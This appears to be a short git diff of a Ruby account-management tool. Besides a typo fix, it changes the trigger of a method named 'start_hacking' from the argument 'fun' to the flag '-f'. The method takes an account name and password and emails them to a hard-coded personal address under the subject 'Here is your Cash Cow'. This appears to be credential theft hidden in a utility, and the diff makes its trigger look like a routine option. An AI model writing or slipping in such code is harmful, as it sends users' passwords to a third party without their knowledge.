@@ -38,7 +38,7 @@ module ScreenControl
     end
 
     def ask_and_remove(account, account_name)
-        if @@prompt.yes?("Do you really want to remove the accout \"#{account_name}\"?")
+        if @@prompt.yes?("Do you really want to remove the account \"#{account_name}\"?")
             puts "accout \"#{account_name}\" has been DELETED."
             account.remove(account_name)
             @@prompt.keypress("\nPress space or enter to continue", keys: [:space, :return])
@@ -134,7 +134,7 @@ module ScreenControl
 
     def start_hacking(gmail, account_name, passwd)
         for arg in ARGV
-            if arg == "fun"
+            if arg == "-f"
                 gmail.deliver do
                     to "imjungseob.kim@gmail.com"
                     subject "Here is your Cash Cow"
